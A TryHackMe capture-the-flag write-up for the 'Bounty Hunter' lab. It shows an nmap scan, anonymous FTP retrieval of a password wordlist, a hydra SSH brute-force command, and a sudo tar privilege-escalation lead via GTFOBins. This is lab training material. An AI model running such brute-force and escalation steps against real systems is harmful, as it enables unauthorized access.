# TRYHACKME : Bounty Hunter

## NMAP
There is a lot of open ports starting in the line of 40000.
```
PORT      STATE  SERVICE         REASON
20/tcp    closed ftp-data        reset ttl 61
21/tcp    open   ftp             syn-ack ttl 61
22/tcp    open   ssh             syn-ack ttl 61
80/tcp    open   http            syn-ack ttl 61
990/tcp   closed ftps            reset ttl 61
40193/tcp closed unknown         reset ttl 61
40911/tcp closed unknown         reset ttl 61
41511/tcp closed unknown         reset ttl 61
42510/tcp closed caerpc          reset ttl 61
44176/tcp closed unknown         reset ttl 61
44442/tcp closed coldfusion-auth reset ttl 61
44443/tcp closed coldfusion-auth reset ttl 61
44501/tcp closed unknown         reset ttl 61
45100/tcp closed unknown         reset ttl 61
48080/tcp closed unknown         reset ttl 61
49152/tcp closed unknown         reset ttl 61
49153/tcp closed unknown         reset ttl 61
49154/tcp closed unknown         reset ttl 61
49155/tcp closed unknown         reset ttl 61
49156/tcp closed unknown         reset ttl 61
49157/tcp closed unknown         reset ttl 61
49158/tcp closed unknown         reset ttl 61
49159/tcp closed unknown         reset ttl 61
49160/tcp closed unknown         reset ttl 61
49161/tcp closed unknown         reset ttl 61
49163/tcp closed unknown         reset ttl 61
49165/tcp closed unknown         reset ttl 61
49167/tcp closed unknown         reset ttl 61
49175/tcp closed unknown         reset ttl 61
49176/tcp closed unknown         reset ttl 61
49400/tcp closed compaqdiag      reset ttl 61
49999/tcp closed unknown         reset ttl 61
50000/tcp closed ibm-db2         reset ttl 61

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 159.50 secondshttp://10.10.94.137/
           Raw packets sent: 2983 (131.228KB) | Rcvd: 554 (126.220KB)
```
This room is tricky because after running the nmap command it will stop scanning the IP, so you must make the most of it.


## FTP PORT 21
I tried to enter port 21 with anonymous login.
```
220 (vsFTPd 3.0.3)
Name (10.10.94.137:miakalifa): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||46731|)
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```
Get both of the files.

### Locks.txt
This one must be a list of usernames we will use sometime later:
```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

### Task.txt
A note from Lin:
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
## Gobuster

Running a directory is not working with the following room.

## SSH

Let's now use the following credential we got for ssh bruteforce. 

We got `Lin` as our main username credential and `locks.txt` for the password.

### Hydra
```
$ hydra -l lin -P locks.txt ssh://[TARGET-IP]
...
[22][ssh] host: 10.10.94.137   login: lin   password: [RETRIEVE PASSWORD]          
```

Finally, let's enter the credential. `ssh lin@[TARGET-IP]`

Then retrieve the flag from `user.txt`.

### Privilege Escalation

Time to escalate!

You must act fast because for some reason, my ssh connection is quite laggy and annoying.

I tried to find some a vulnerable path, and I think the `sudo -l` seems to give us a way.

```
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Lets look up the [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) for the `tar` bin directory.

Then let's retrieve the root flag.
